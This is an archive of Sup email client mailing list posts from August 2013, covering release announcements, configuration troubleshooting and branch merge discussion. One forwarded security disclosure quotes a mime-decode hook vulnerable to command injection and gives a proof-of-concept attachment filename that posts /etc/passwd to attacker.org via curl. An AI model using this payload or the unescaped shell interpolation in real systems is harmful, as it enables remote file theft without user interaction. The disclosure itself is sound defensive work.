@@ -1,0 +1,682 @@
+From adam.bogacki at clear.net.nz  Fri Aug  2 21:38:33 2013
+From: adam.bogacki at clear.net.nz (Adam Bogacki)
+Date: Sat, 03 Aug 2013 09:38:33 +1200
+Subject: [sup-talk] Release Sup 0.13.1
+In-Reply-To: <mailman.20.1375449469.10946.sup-talk@rubyforge.org>
+References: <mailman.20.1375449469.10946.sup-talk@rubyforge.org>
+Message-ID: <51FC26D9.5020708@clear.net.nz>
+
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+On 03/08/13 01:17, sup-talk-request at rubyforge.org wrote:
+
+It's good to see signs of life on this list.
+
+I was getting used to sup-mail on debian wheezy, then sid, but then one
+day I received
+
+> adam at Candide:~$ sup-mail
+> /usr/lib/ruby/1.9.1/rubygems/custom_require.rb:36:in `require': iconv
+will be deprecated in the future, use String#encode instead.
+> [2013-08-03 07:58:08 +1200] ERROR: oh crap, an exception
+> ----------------------------------------------------------------
+> I'm very sorry. It seems that an error occurred in Sup. Please
+> accept my sincere apologies. Please submit the contents of
+> /home/adam/.sup/exception-log.txt and a brief report of the
+> circumstances to http://masanjin.net/sup-bugs/ so that I might
+> address this problem. Thank you!
+>
+> Sincerely,
+> William
+> ----------------------------------------------------------------
+> --- TypeError from thread: main
+> can't convert String into Array
+> /usr/lib/ruby/vendor_ruby/sup/account.rb:64:in `add_account'
+> /usr/lib/ruby/vendor_ruby/sup/account.rb:38:in `initialize'
+> /usr/lib/ruby/vendor_ruby/sup/util.rb:576:in `new'
+> /usr/lib/ruby/vendor_ruby/sup/util.rb:576:in `init'
+> /usr/lib/ruby/vendor_ruby/sup.rb:166:in `start'
+> /usr/bin/sup-mail:164:in `<module:Redwood>'
+> /usr/bin/sup-mail:80:in `<main>'
+> adam at Candide:~$
+.. and it has been that way ever since.
+
+Can anyone explain what is happening and recommend a fix ?
+
+Hang in there guys, many now polished projects have had rocky beginnings ..
+
+Regards,
+
+Adam Bogacki,
+adam.bogacki at clear.net.nz
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.14 (GNU/Linux)
+Comment: Using GnuPG with Icedove - http://www.enigmail.net/
+
+iQEcBAEBAgAGBQJR/CbHAAoJELXBCnrK+Nj6ftQH/15Io+NN72Sqmgj0yNoNSTyV
+t7rttkqbbp42WFrtOqH9lSjdkcMwpdEDENkhDfsRckjcSbGHsQwGOJXCE9iBUWwT
+rYvSqtcRTJS3keW0JAEX3hdauWIoSaqzVHCNJn6GM/YIScf6mwWddE8IP2Sil7SH
+AfBTwIlCSNQcPR6Tdyj5V8bXgIHw0j7V4GW0QyE+ijeGub3JOBDXg7tUERM/qR9j
+PzBPfQ25YMEMq8E8LBK6y/yNk8jxc2Q1FZrqwL17+hfJUeFzzAXQp8kzJzk/uVPI
+EqHK38KULOGS3h1T77x1XQXj7AjpUv/RneCYuoZo6YhXMuxg4YjKYGXVY6VuzY8=
+=7kB3
+-----END PGP SIGNATURE-----
+
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: <http://rubyforge.org/pipermail/sup-talk/attachments/20130803/a9a536b8/attachment.html>
+
+From eg at gaute.vetsj.com  Fri Aug  2 22:38:09 2013
+From: eg at gaute.vetsj.com (Gaute Hope)
+Date: Sat, 03 Aug 2013 00:38:09 +0200
+Subject: [sup-talk] Release Sup 0.13.1
+In-Reply-To: <51FC26D9.5020708@clear.net.nz>
+References: <mailman.20.1375449469.10946.sup-talk@rubyforge.org>
+	<51FC26D9.5020708@clear.net.nz>
+Message-ID: <51FC34D1.9050302@gaute.vetsj.com>
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+
+
+On 02. aug. 2013 23:38, Adam Bogacki wrote:
+> 
+> On 03/08/13 01:17, sup-talk-request at rubyforge.org wrote:
+> 
+> It's good to see signs of life on this list.
+> 
+> I was getting used to sup-mail on debian wheezy, then sid, but then
+> one day I received
+> 
+>> adam at Candide:~$ sup-mail 
+>> /usr/lib/ruby/1.9.1/rubygems/custom_require.rb:36:in `require':
+>> iconv
+> will be deprecated in the future, use String#encode instead.
+>> [2013-08-03 07:58:08 +1200] ERROR: oh crap, an exception 
+>> ---------------------------------------------------------------- 
+>> I'm very sorry. It seems that an error occurred in Sup. Please 
+>> accept my sincere apologies. Please submit the contents of 
+>> /home/adam/.sup/exception-log.txt and a brief report of the 
+>> circumstances to http://masanjin.net/sup-bugs/ so that I might 
+>> address this problem. Thank you!
+> 
+>> Sincerely, William 
+>> ---------------------------------------------------------------- 
+>> --- TypeError from thread: main can't convert String into Array 
+>> /usr/lib/ruby/vendor_ruby/sup/account.rb:64:in `add_account' 
+>> /usr/lib/ruby/vendor_ruby/sup/account.rb:38:in `initialize' 
+>> /usr/lib/ruby/vendor_ruby/sup/util.rb:576:in `new' 
+>> /usr/lib/ruby/vendor_ruby/sup/util.rb:576:in `init' 
+>> /usr/lib/ruby/vendor_ruby/sup.rb:166:in `start' 
+>> /usr/bin/sup-mail:164:in `<module:Redwood>' 
+>> /usr/bin/sup-mail:80:in `<main>' adam at Candide:~$
+> .. and it has been that way ever since.
+> 
+> Can anyone explain what is happening and recommend a fix ?
+
+Hi, I think this is fixed in the latest release (there might be a
+problem with sources.yaml). Try installing via gem.
+
+Regards, Gaute
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2.0.20 (GNU/Linux)
+Comment: Using GnuPG with Thunderbird - http://www.enigmail.net/
+
+iQIcBAEBAgAGBQJR/DTRAAoJEJgnp+igdJAjRlYP/iTISP47irKhXc4KsRPq7RTu
+QAbaMEwGvMTdE8E3Lq+wuB1ikbs9elYrWbqzatv1F2K0jcc8II73KYNOexFBhlSZ
+MGDPB/N9KP1XIeDYMuJ/TE1zfaW25GZevjahpVjkQj/XBh/YfV66dFPLWb7HReEb
+wpmSz8BDoLvQwGJ6Ydl/2BhR9g0JlCvMeuAjYNn135QjzBeCM5QvGQHtH6JGIexx
+pV1EI1hTelRfL9spnOWpzar5C1trxlh/evlfp0xG5wIAjt+hmgrdWezNv+P6YF6/
+Ul2KwcLx0T3ObchjRGKWUMyUqPY7593Xby1UMK6ll+Zqs0eFutGoEUhGPri/gxQJ
+MfXZ3M/ZKPoTBk2xsIEUIH1oRRwgjdglIgy9easagjKjF51ZJu55K01DtXJMKsqD
+DWkLw1AN92KH8Sb6eutpjHiUxoC+Rwj0d/mtD9paVDljL7Iie5lSKl6LVVhfZKG7
+WKiGDoO081IhYwsbT6ORLJ2/NJr0PF4VWIBBs8xdOD37dLbznzFT56i3+NO8sjK0
+MPnqVxc4ZK+/ezUpMZ8vFY3OZeECUq1UqZeOkaV6SbhgQmK+J+Mpi36HI/rqWy1C
+l2oS00GS9xkhbAt3If56D1WbqiOdgwntUwljNoRupxRdAbugL/d+EzK24fDHaxbM
+apXcVpArB3Qs3/QIh5us
+=c2xe
+-----END PGP SIGNATURE-----
+
+From eg at gaute.vetsj.com  Sat Aug  3 09:36:24 2013
+From: eg at gaute.vetsj.com (Gaute Hope)
+Date: Sat, 03 Aug 2013 11:36:24 +0200
+Subject: [sup-talk] Release Sup 0.13.1
+In-Reply-To: <51FC34D1.9050302@gaute.vetsj.com>
+References: <mailman.20.1375449469.10946.sup-talk@rubyforge.org>
+	<51FC26D9.5020708@clear.net.nz> <51FC34D1.9050302@gaute.vetsj.com>
+Message-ID: <51FCCF18.1040807@gaute.vetsj.com>
+
+
+
+On 03. aug. 2013 00:38, Gaute Hope wrote:
+> On 02. aug. 2013 23:38, Adam Bogacki wrote:
+>>> adam at Candide:~$ sup-mail 
+>>> /usr/lib/ruby/1.9.1/rubygems/custom_require.rb:36:in `require':
+>>> iconv
+>> will be deprecated in the future, use String#encode instead.
+>>> [2013-08-03 07:58:08 +1200] ERROR: oh crap, an exception 
+>>> ---------------------------------------------------------------- 
+>>> I'm very sorry. It seems that an error occurred in Sup. Please 
+>>> accept my sincere apologies. Please submit the contents of 
+>>> /home/adam/.sup/exception-log.txt and a brief report of the 
+>>> circumstances to http://masanjin.net/sup-bugs/ so that I might 
+>>> address this problem. Thank you!
+> 
+>>> Sincerely, William 
+>>> ---------------------------------------------------------------- 
+>>> --- TypeError from thread: main can't convert String into Array 
+>>> /usr/lib/ruby/vendor_ruby/sup/account.rb:64:in `add_account' 
+>>> /usr/lib/ruby/vendor_ruby/sup/account.rb:38:in `initialize' 
+>>> /usr/lib/ruby/vendor_ruby/sup/util.rb:576:in `new' 
+>>> /usr/lib/ruby/vendor_ruby/sup/util.rb:576:in `init' 
+>>> /usr/lib/ruby/vendor_ruby/sup.rb:166:in `start' 
+>>> /usr/bin/sup-mail:164:in `<module:Redwood>' 
+>>> /usr/bin/sup-mail:80:in `<main>' adam at Candide:~$
+>> .. and it has been that way ever since.
+> 
+>> Can anyone explain what is happening and recommend a fix ?
+> 
+> Hi, I think this is fixed in the latest release (there might be a
+> problem with sources.yaml). Try installing via gem.
+
+On close inspection it seems this is a separate issue (originally though
+of #42 [0]). Would you mind pastebinning/posting your config.yaml
+(anonymized)? It seems like something in the account configuration is
+triggering the error. Also, what version are you running of sup?
+
+Feel free to open an issue at: https://github.com/sup-heliotrope/sup
+
+Regards, Gaute
+
+[0] https://github.com/sup-heliotrope/sup/pull/42
+
+From eg at gaute.vetsj.com  Sat Aug  3 09:47:59 2013
+From: eg at gaute.vetsj.com (Gaute Hope)
+Date: Sat, 03 Aug 2013 11:47:59 +0200
+Subject: [sup-talk] Release Sup 0.13.1
+In-Reply-To: <51FCCF18.1040807@gaute.vetsj.com>
+References: <mailman.20.1375449469.10946.sup-talk@rubyforge.org>
+	<51FC26D9.5020708@clear.net.nz> <51FC34D1.9050302@gaute.vetsj.com>
+	<51FCCF18.1040807@gaute.vetsj.com>
+Message-ID: <51FCD1CF.7010708@gaute.vetsj.com>
+
+On 03. aug. 2013 11:36, Gaute Hope wrote:
+> On 03. aug. 2013 00:38, Gaute Hope wrote:
+>> On 02. aug. 2013 23:38, Adam Bogacki wrote:
+------------
+>>>> --- TypeError from thread: main can't convert String into Array 
+>>>> /usr/lib/ruby/vendor_ruby/sup/account.rb:64:in `add_account' 
+>>>> /usr/lib/ruby/vendor_ruby/sup/account.rb:38:in `initialize' 
+>>>> /usr/lib/ruby/vendor_ruby/sup/util.rb:576:in `new' 
+>>>> /usr/lib/ruby/vendor_ruby/sup/util.rb:576:in `init' 
+>>>> /usr/lib/ruby/vendor_ruby/sup.rb:166:in `start' 
+>>>> /usr/bin/sup-mail:164:in `<module:Redwood>' 
+>>>> /usr/bin/sup-mail:80:in `<main>' adam at Candide:~$
+>>> .. and it has been that way ever since.
+>>
+>>> Can anyone explain what is happening and recommend a fix ?
+
+The problem is likely an incorrectly set up :alternates: in config.yaml,
+it should be of the format:
+
+:alternates:
+  - email2 at asdf.asdf
+  - email3 at asdf.as
+
+if it is set up like:
+:alternates: asdfa at adsf.asdf
+
+if will fail. A more descriptive error message should be shown with the
+patch in pull request #119 [0]. Please test it if you have the chance,
+otherwise let me know if changing config.yaml did the trick.
+
+[0] https://github.com/sup-heliotrope/sup/pull/119
+
+Cheers, Gaute
+
+From eg at gaute.vetsj.com  Thu Aug 15 08:33:23 2013
+From: eg at gaute.vetsj.com (Gaute Hope)
+Date: Thu, 15 Aug 2013 10:33:23 +0200
+Subject: [sup-talk] Sup Release 0.14.0
+Message-ID: <1376554850-sup-6592@qwerzila>
+
+Greetings,
+
+I have just release Sup 0.14.0 which contains a lot of updates. Check
+out the Release Notes below for more details.
+
+Important:
+- This release does no longer work on Ruby 1.8.
+- Configuration files must be migrated from Sup 0.13 [1].
+- Read the migration notice [1].
+
+If you are not feeling very adventurous, stay with Sup 0.13 for a little
+while yet. Remember to back up your current ~/.sup before upgrading in
+case you need to downgrade.
+
+Happy sup! Thanks to all the contributors and testers!
+
+Check the wiki for installation instructions [2] or just do a:
+
+  $ gem install sup
+
+Report issues to our tracker at GitHub [3].
+
+
+Cheers, Gaute
+
+[1] https://github.com/sup-heliotrope/sup/wiki/Migration-0.13-to-0.14
+[2] https://github.com/sup-heliotrope/sup/wiki/
+[3] https://github.com/sup-heliotrope/sup/issues
+
+
+== Release Notes ==
+CJK-compatability, Psych usage, thread safety, GPGME 2.0 support. Sup is now
+Ruby 1.9 based, and apart from RMail - ready for Ruby 2.0.0.
+
+Sup now uses Psych as a YAML parser (default by Ruby) and your previous
+configuration files (~/.sup/*.yaml) may need to be migrated or re-created for
+them to work with the new sup. A migration script is included for this.
+
+Check https://github.com/sup-heliotrope/sup/wiki/Migration-0.13-to-0.14 for
+the latest instructions.
+
+First back up your ~/.sup directory and index, after installing the new sup
+run:
+
+$ sup-psych-ify-config-files
+
+to migrate your files. You should now be all set for buisness.
+
+
+
+From eric.weikl at gmx.net  Thu Aug 15 13:22:14 2013
+From: eric.weikl at gmx.net (Eric Weikl)
+Date: Thu, 15 Aug 2013 15:22:14 +0200
+Subject: [sup-talk] Is maildir-sync ready for prime time?
+In-Reply-To: <1366143381-sup-8459@mint>
+References: <CAHsqw9sqBv-5zkdKhPcOwzi-qpe250U3ksHAvgwTENJ8EtozFA@mail.gmail.com>
+	<CAOxvSbfuBUYc7fTS=Ov2gBi6JtCkhmy8YVP3iUXwENnmLdzH3Q@mail.gmail.com>
+	<51692285.8000709@gaute.vetsj.com>
+	<CAHsqw9ue9AqTO4OxVDUzb-3u7GShxZRmjPDNzwJQVtsZi_3icw@mail.gmail.com>
+	<51695AF1.2070701@gaute.vetsj.com>
+	<CAHsqw9v46_d+n=XUeg76zmws+kjtit3SfQ59NZtTxMYrJ8F1Vg@mail.gmail.com>
+	<5169925C.1060701@gaute.vetsj.com>
+	<516997BD.7010409@gaute.vetsj.com> <1365938152-sup-6420@mint>
+	<516A9BA0.7040906@gaute.vetsj.com> <1366143381-sup-8459@mint>
+Message-ID: <1376572537-sup-83@mint>
+
+Hi fellow sup users,
+
+the maildir-sync branch has been hanging around for quite a while. Since
+sup 0.14.0 is out now, we could consider merging it into the developer
+branch. I've been using the branch continuously and haven't encountered
+any problems so far.
+
+Has anyone else tried the branch, or is willing to do so? It would be
+great to have some more opinions on it.
+
+Gaute created a corresponding pull request here:
+https://github.com/sup-heliotrope/sup/pull/126
+
+Cheers,
+Eric
+
+On 04/16/2013 22:30:26, Eric Weikl wrote:
+> Hi everyone,
+> 
+> I created a new branch with all the commits from Damien Leone and
+> Edward Yang related to maildir syncback and put it here:
+> 
+> https://github.com/sup-heliotrope/sup/tree/maildir-sync
+> 
+> I skipped some advanced stuff like Edward's inotify support for now. We
+> can add that later.
+> 
+> I performed some basic testing, but it would be great if some more
+> people could give it a try. There's some documentation in the wiki:
+> 
+> https://github.com/sup-heliotrope/sup/wiki/Maildir-Syncback
+> 
+> Cheers,
+> Eric
+
+From steven at schmeiser.org  Thu Aug 15 13:35:17 2013
+From: steven at schmeiser.org (Steven Schmeiser)
+Date: Thu, 15 Aug 2013 09:35:17 -0400
+Subject: [sup-talk] Is maildir-sync ready for prime time?
+In-Reply-To: <1376572537-sup-83@mint>
+References: <CAHsqw9sqBv-5zkdKhPcOwzi-qpe250U3ksHAvgwTENJ8EtozFA@mail.gmail.com>
+	<CAOxvSbfuBUYc7fTS=Ov2gBi6JtCkhmy8YVP3iUXwENnmLdzH3Q@mail.gmail.com>
+	<51692285.8000709@gaute.vetsj.com>
+	<CAHsqw9ue9AqTO4OxVDUzb-3u7GShxZRmjPDNzwJQVtsZi_3icw@mail.gmail.com>
+	<51695AF1.2070701@gaute.vetsj.com>
+	<CAHsqw9v46_d+n=XUeg76zmws+kjtit3SfQ59NZtTxMYrJ8F1Vg@mail.gmail.com>
+	<5169925C.1060701@gaute.vetsj.com>
+	<516997BD.7010409@gaute.vetsj.com> <1365938152-sup-6420@mint>
+	<516A9BA0.7040906@gaute.vetsj.com> <1366143381-sup-8459@mint>
+	<1376572537-sup-83@mint>
+Message-ID: <1376573604-sup-1651@indy.local>
+
+I've been using the maildir-sync branch for a month or so and have not encountered any problems.  I also vote for a merge.
+
+Steve
+ 
+> Hi fellow sup users,
+> 
+> the maildir-sync branch has been hanging around for quite a while. Since
+> sup 0.14.0 is out now, we could consider merging it into the developer
+> branch. I've been using the branch continuously and haven't encountered
+> any problems so far.
+> 
+> Has anyone else tried the branch, or is willing to do so? It would be
+> great to have some more opinions on it.
+> 
+> Gaute created a corresponding pull request here:
+> https://github.com/sup-heliotrope/sup/pull/126
+> 
+> Cheers,
+> Eric
+> 
+> On 04/16/2013 22:30:26, Eric Weikl wrote:
+> > Hi everyone,
+> > 
+> > I created a new branch with all the commits from Damien Leone and
+> > Edward Yang related to maildir syncback and put it here:
+> > 
+> > https://github.com/sup-heliotrope/sup/tree/maildir-sync
+> > 
+> > I skipped some advanced stuff like Edward's inotify support for now. We
+> > can add that later.
+> > 
+> > I performed some basic testing, but it would be great if some more
+> > people could give it a try. There's some documentation in the wiki:
+> > 
+> > https://github.com/sup-heliotrope/sup/wiki/Maildir-Syncback
+> > 
+> > Cheers,
+> > Eric
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: signature.asc
+Type: application/pgp-signature
+Size: 841 bytes
+Desc: not available
+URL: <http://rubyforge.org/pipermail/sup-talk/attachments/20130815/d3f36b0b/attachment.bin>
+
+From matthieu.rakotojaona at gmail.com  Thu Aug 15 18:30:52 2013
+From: matthieu.rakotojaona at gmail.com (Matthieu Rakotojaona)
+Date: Thu, 15 Aug 2013 20:30:52 +0200
+Subject: [sup-talk] Sup Release 0.14.0
+In-Reply-To: <1376554850-sup-6592@qwerzila>
+References: <1376554850-sup-6592@qwerzila>
+Message-ID: <1376588663-sup-4993@kpad>
+
+Thank you !
+
+I've tried the install sup via the gem on a naked machine and I've faced
+a few problems:
+
+* There is a bug in rubymail as pointed in [0]. I see it hasn't been
+  merged yet and doubt it will ever be. I replaced the upstream one with
+  the one from your repo (1) and it works as needed. Can we use a
+  rmail-sup, specific to us, just for the time we use this lib, just
+  like ncursesw-sup ?
+
+* There was a problem with the unicode gem. I had an old version of
+  gem running (you need >= 2.0.2 as stated in [2] and followings). Here
+  are the steps that fixed the problem:
+
+  Update gem:
+  $ sudo gem update --system
+
+  Reinstall the unicode gem:
+  $ gem uninstall unicode
+  $ gem install unicode
+
+* Those damn encoding problems struck me. We're trying to fix_encoding a
+  bunch of Strings here and there and one of them at least is a frozen
+  string so it doesn't work. See PR130 [3] for this.
+
+Apart from that, it works well. Thank you guys for the hard work !
+You're making me ashamed of not being very participative in this,
+though :)
+
+[0] https://github.com/matta/rubymail/pull/2
+[1] https://github.com/gauteh/rubymail
+[2] https://github.com/blackwinter/unicode/issues/4#issuecomment-14086773
+[3] https://github.com/sup-heliotrope/sup/pull/130
+
+-- 
+Matthieu Rakotojaona
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: signature.asc
+Type: application/pgp-signature
+Size: 836 bytes
+Desc: not available
+URL: <http://rubyforge.org/pipermail/sup-talk/attachments/20130815/cc230eef/attachment.bin>
+
+From eg at gaute.vetsj.com  Thu Aug 15 21:36:45 2013
+From: eg at gaute.vetsj.com (Gaute Hope)
+Date: Thu, 15 Aug 2013 23:36:45 +0200
+Subject: [sup-talk] Sup Release 0.14.0
+In-Reply-To: <1376588663-sup-4993@kpad>
+References: <1376554850-sup-6592@qwerzila>
+ <1376588663-sup-4993@kpad>
+Message-ID: <1376602282-sup-4187@qwerzila>
+
+Excerpts from Matthieu Rakotojaona's message of 2013-08-15 20:30:52 +0200:
+> Thank you !
+> 
+> I've tried the install sup via the gem on a naked machine and I've faced
+> a few problems:
+> 
+> * There is a bug in rubymail as pointed in [0]. I see it hasn't been
+>   merged yet and doubt it will ever be. I replaced the upstream one with
+>   the one from your repo (1) and it works as needed. Can we use a
+>   rmail-sup, specific to us, just for the time we use this lib, just
+>   like ncursesw-sup ?
+
+Yeah, was a bit hesitant to go there, but I guess it is reasonably
+sensible fix :) I'm OK with it. I would rather see us get Mail running
+(writing this email from the use-mail branch, seamlessly using RMail on
+the same index), but it is still a while to go..
+ 
+> * There was a problem with the unicode gem. I had an old version of
+> gem running (you need >= 2.0.2 as stated in [2] and followings). Here
+> are the steps that fixed the problem:
+> 
+>   Update gem: $ sudo gem update --system
+> 
+>   Reinstall the unicode gem: $ gem uninstall unicode $ gem install
+>   unicode
+
+Ah nice catch, we should put this somewhere in the wiki..! troubleshooting?
+ 
+> * Those damn encoding problems struck me. We're trying to fix_encoding a
+>   bunch of Strings here and there and one of them at least is a frozen
+>   string so it doesn't work. See PR130 [3] for this.
+
+Nice, its extremly hackishy, but those mails and user inputs just don't
+make any sense.. :D Your PR should be good to merge.
+ 
+> Apart from that, it works well. Thank you guys for the hard work !
+> You're making me ashamed of not being very participative in this,
+> though :)
+
+Yey, thanks!
+ 
+Cheers, Gaute
+
+
+From eg at gaute.vetsj.com  Sun Aug 18 18:14:38 2013
+From: eg at gaute.vetsj.com (Gaute Hope)
+Date: Sun, 18 Aug 2013 20:14:38 +0200
+Subject: [sup-talk] Fwd: Security issue with suggested configuration of sup
+Message-ID: <1376849419-sup-8191@qwerzila>
+
+Greetings suppers,
+
+joernchen has pointed out to me that our suggested hook for viewing html
+attachment has a serious security issue. The updated suggestion in [0] (wiki)
+should be safer.
+
+
+Please make sure that you update your mime-decode hook!
+
+
+Best regards, Gaute
+
+
+
+[0] https://github.com/sup-heliotrope/sup/wiki/Viewing-Attachments
+
+
+
+--- Begin forwarded message from joernchen ---
+From: joernchen <...>
+To: eg <eg at gaute.vetsj.com>
+Date: Sat, 17 Aug 2013 14:14:29 +0200
+Subject: Security issue with suggested configuration of sup
+
+[...]
+
+At [0] the suggested configuration for viewing HTML attachments with
+sup using the mime-decode hook is given as follows:
+
+unless sibling_types.member? "text/plain"
+  case content_type
+  when "text/html"
+    `/usr/bin/w3m -dump -T #{content_type} '#{filename}'`
+  end
+end
+
+This piece of code however is prone to command injection via the file
+name of the attached file. The command injection triggers upon sup
+indexing the mail, so no user interaction is needed.
+
+A better approach would be the following:
+
+require 'shellwords'
+unless sibling_types.member? "text/plain"
+  case content_type
+  when "text/html"
+    `/usr/bin/w3m -dump -T #{content_type} #{Shellwords.escape filename}`
+  end
+end
+
+[...]
+
+A simple PoC would be sending an email with a file attachment named
+like:
+
+'$(cd .. && cd .. && cd .. && cd .. && cd etc && curl --data @passwd attacker.org)'.html
+
+to a sup user making use of the suggested decode hook.
+
+[0] https://github.com/sup-heliotrope/sup/wiki/Viewing-Attachments
+
+[...]
+
+From adam.bogacki at clear.net.nz  Thu Aug 22 23:41:58 2013
+From: adam.bogacki at clear.net.nz (Adam Bogacki)
+Date: Fri, 23 Aug 2013 11:41:58 +1200
+Subject: [sup-talk] Problem adding sources from icedove, aka 'thunderbird'
+Message-ID: <5216A1C6.5030300@clear.net.nz>
+
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Hi, the example given at
+
+https://github.com/sup-heliotrope/sup/wiki/Thunderbird-Import
+
+is
+
+| `ls mdirs`.split("\n").each {|dir| `ls mdirs/#{dir}`.split("\n").each
+   {|mdir| `sup-add -ul #{dir.downcase},#{mdir.downcase}
+maildir:/home/dave/Mailstore/mdirs/#{dir}/#{mdir}`}}
+
+but my icedove directory is
+
+/home/adam/.icedove/9zurob0v.default/Mail/mdirs/smart
+mailboxes/Mailstore:~$ ls
+cur  new  tmp
+
+What, in this case, is the correct way to add it to sup ?|
+
+Regards,
+
+Adam.
+
+- -- 
+Adam Bogacki
+
+adam.bogacki at clear.net.nz
+
+http://www.independent.academia.edu/AdamBogacki
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.14 (GNU/Linux)
+Comment: Using GnuPG with Icedove - http://www.enigmail.net/
+
+iQEcBAEBAgAGBQJSFqG0AAoJELXBCnrK+Nj6ESQH/0E+20kRsEdFFkpFsnLIR26i
+GlWdbrxNKsw7lfX7JJja+gnceyvI6l9zaX1vM3f9rad7y/YQ9Gfbh+9Hp0R0Y1wi
+4ZTCO2kNRnZc0fjluGmtMeUMAUdGKfFqJLxD4bKkvQWCd8SO72ubFz3usQBIAi3m
+IX2ZTWblH39HFyc0Cd60aGfkWLEHNsrA8TKxiN1KOLnT8Ryiula4f4hEWzfebRyz
+c/4nZouuCqFNDMUhFo7lp/XoBwZqfMNtlGtBKOrQ/LmRzEL2AlJJlqRyvd/FnIXe
+uFmEBYDpEYE5X4IYGfcIEk558fIdMvqNYg5PUkY+LXMFXl58bU0DhTlORriF10Q=
+=b63b
+-----END PGP SIGNATURE-----
+
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: <http://rubyforge.org/pipermail/sup-talk/attachments/20130823/df007871/attachment.html>
+
+From eg at gaute.vetsj.com  Sat Aug 31 16:27:03 2013
+From: eg at gaute.vetsj.com (Gaute Hope)
+Date: Sat, 31 Aug 2013 18:27:03 +0200
+Subject: [sup-talk] Release 0.14.1
+Message-ID: <1377965598-sup-8230@qwerzila>
+
+Hi all,
+
+Release 0.14.1 is out. This is a service release to 0.14.0 + one
+small feature, a pre-defined 'All mail' search.
+
+Important: If you are upgrading from a Sup version previous 0.14.0
+please read the migration instructions in the wiki [0].
+
+Installation instructions for various platforms are also described in
+the wiki [1].
+
+Please report any issues you encounter to our GitHub issue tracker [2].
+
+
+We hope to get maildir-syncback (which Eric Weikl is maintaining) merged
+in for the next release 0.14.2, call out if you have tested or run the
+maildir-syncback branch. We would very much appreciate your experineces
+(good ones! or bad ones!), the tracking issue is here:
+
+  https://github.com/sup-heliotrope/sup/pull/126
+
+Thanks to those that have already reported their experiences, as well as
+all the contributors to sup (code [3], issues, maintenance and
+support!).
+
+
+
+Cheers, Gaute
+
+
+[0] https://github.com/sup-heliotrope/sup/wiki/Migration-0.13-to-0.14
+[1] https://github.com/sup-heliotrope/sup/wiki
+[2] https://github.com/sup-heliotrope/sup/issues
+[3] https://github.com/sup-heliotrope/sup/blob/release-0.14.1/CONTRIBUTORS
+
+
